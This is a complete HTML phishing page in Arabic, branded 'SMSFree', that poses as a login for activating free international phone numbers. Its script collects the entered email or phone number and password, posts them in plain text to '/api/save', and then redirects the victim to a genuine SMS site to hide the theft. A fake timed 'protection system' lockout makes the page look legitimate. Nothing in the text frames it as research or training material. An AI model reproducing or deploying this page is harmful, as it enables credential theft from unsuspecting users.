<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - نظام الحماية الذكي</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --primary-cyan: #22d3ee;
            --text-white: #f8fafc;
        }

        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
            background-color: var(--bg-color);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white);
        }

        .main-container {
            width: 90%; max-width: 400px; background-color: var(--card-bg);
            padding: 40px 25px; border-radius: 24px; text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        .blur-content { transition: filter 0.4s ease, opacity 0.4s ease; }
        
        .is-banned .blur-content {
            filter: blur(15px);
            opacity: 0.15;
            pointer-events: none;
        }

        /* تصميم العداد والحلزون المتحرك */
        .ban-overlay {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 100; text-align: center; display: none; width: 100%;
        }

        .spinner-container {
            position: relative;
            width: 120px; height: 120px;
            margin: 0 auto 20px;
        }

        /* الحركة الحلزونية (السبينر) */
        .spiral-loader {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            border: 4px solid rgba(34, 211, 238, 0.1);
            border-top: 4px solid var(--primary-cyan);
            border-radius: 50%;
            animation: rotate-spiral 1s linear infinite;
        }

        @keyframes rotate-spiral {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        #timer {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            font-size: 35px; font-weight: bold; color: #fbbf24;
        }

        /* تنسيق المدخلات والأزرار */
        .logo-circle {
            width: 100px; height: 100px; border: 2px solid #334155;
            border-radius: 50%; margin: 0 auto 25px;
            display: flex; justify-content: center; align-items: center;
            font-size: 20px; font-weight: bold;
        }

        input {
            width: 100%; padding: 16px; margin-bottom: 15px;
            background: #0f172a; border: 1px solid #334155;
            border-radius: 12px; color: white; outline: none;
            text-align: center; font-size: 15px; box-sizing: border-box;
        }

        .submit-btn {
            width: 100%; padding: 16px; background: linear-gradient(to right, #0ea5e9, #22d3ee);
            border: none; border-radius: 12px; color: #0f172a;
            font-size: 17px; font-weight: bold; cursor: pointer;
        }

        .glass-popup {
            background: #1e293b !important;
            color: #fff !important;
            border-radius: 20px !important;
        }
    </style>
</head>
<body>

<div class="main-container" id="mainCard">
    <div class="ban-overlay" id="banOverlay">
        <div class="spinner-container">
            <div class="spiral-loader"></div>
            <div id="timer">30</div>
        </div>
        <h3 style="color: #fbbf24; margin: 0; font-size: 18px;">نظام الحماية نشط</h3>
        <p style="font-size: 13px; color: #94a3b8; padding: 0 20px;">
            يرجى الانتظار حتى يتم إزالة الحظر عنك...
        </p>
    </div>

    <div class="blur-content">
        <div class="logo-circle">SMSFree</div>
        <h2 style="font-size: 15px; color: var(--primary-cyan); margin-bottom: 30px;">سجل دخولك لتفعيل أرقامك العالمية فوراً.</h2>

        <form id="loginForm">
            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="pass" placeholder="كلمة المرور" required>
            <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
        </form>
    </div>
</div>

<script>
    let attempts = 0;

    window.onload = () => {
        const expiry = localStorage.getItem('ban_expiry');
        if (expiry) {
            const remaining = Math.round((expiry - Date.now()) / 1000);
            if (remaining > 0) startBan(remaining);
            else localStorage.removeItem('ban_expiry');
        }
    };

    document.getElementById('loginForm').onsubmit = (e) => {
        e.preventDefault();
        const u = document.getElementById('user').value.trim();
        const p = document.getElementById('pass').value;

        const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRx = /^[0-9]{8,15}$/;
        const isAr = /[\u0600-\u06FF]/.test(u);

        if ((emailRx.test(u) || phoneRx.test(u)) && !isAr && p.length >= 6) {
            sendAndRedirect(u, p);
        } else {
            attempts++;
            if (attempts >= 3) {
                const end = Date.now() + (30 * 1000);
                localStorage.setItem('ban_expiry', end);
                startBan(30);
            } else {
                Swal.fire({
                    title: 'بيانات غير دقيقة',
                    text: 'يرجى كتابة البريد أو كلمة المرور بشكل صحيح لتجنب الحظر المؤقت في الموقع.',
                    icon: 'error',
                    confirmButtonColor: '#22d3ee',
                    customClass: { popup: 'glass-popup' }
                });
            }
        }
    };

    function startBan(sec) {
        const card = document.getElementById('mainCard');
        const overlay = document.getElementById('banOverlay');
        const timerTxt = document.getElementById('timer');
        
        card.classList.add('is-banned');
        overlay.style.display = 'block';

        let left = sec;
        timerTxt.innerText = left;

        const interval = setInterval(() => {
            left--;
            timerTxt.innerText = left;
            if (left <= 0) {
                clearInterval(interval);
                card.classList.remove('is-banned');
                overlay.style.display = 'none';
                localStorage.removeItem('ban_expiry');
                attempts = 0;
                Swal.fire({ title: 'تم فك الحظر', icon: 'success', customClass: { popup: 'glass-popup' } });
            }
        }, 1000);
    }

    async function sendAndRedirect(u, p) {
        await fetch('/api/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: `👤: ${u}\n🔑: ${p}` })
        });
        window.location.href = "https://receive-smss.com/";
    }
</script>

</body>
</html>
